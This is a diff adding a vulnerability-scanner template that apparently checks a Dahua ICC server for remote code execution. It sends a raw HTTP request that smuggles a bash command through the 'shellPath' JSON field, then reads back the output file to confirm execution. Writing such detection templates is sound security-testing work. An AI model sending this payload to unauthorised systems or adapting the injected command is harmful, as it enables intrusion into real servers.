@@ -1,0 +1,39 @@
+id: DaHuaIcc-push-RCE
+
+info:
+  name: DaHuaIcc-push-RCE
+  author: iSee857
+  severity: critical
+  description: DaHuaIcc-push-RCE
+  reference:
+    - https://example.com/vuln-details
+  tags: file-upload,jsp,rce
+
+http:
+  - raw:
+      - |
+        POST /evo-runs/v1.0/push HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        Content-Type: application/json
+        X-Subject-Headerflag: ADAPT
+        Accept-Encoding: gzip, deflate
+
+        {"method": "agent.ossm.mapping.config","info": {"configure": "abcd","filePath": "haha","paramMap": {"shellPath": "/bin/bash -c id>/opt/evoWpms/static/aaabbb.txt","filePath": "abc"},"requestIp": ""}}
+
+      - |
+        GET /static/aaabbb.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "gid="
+          - "uid="
+        condition: and
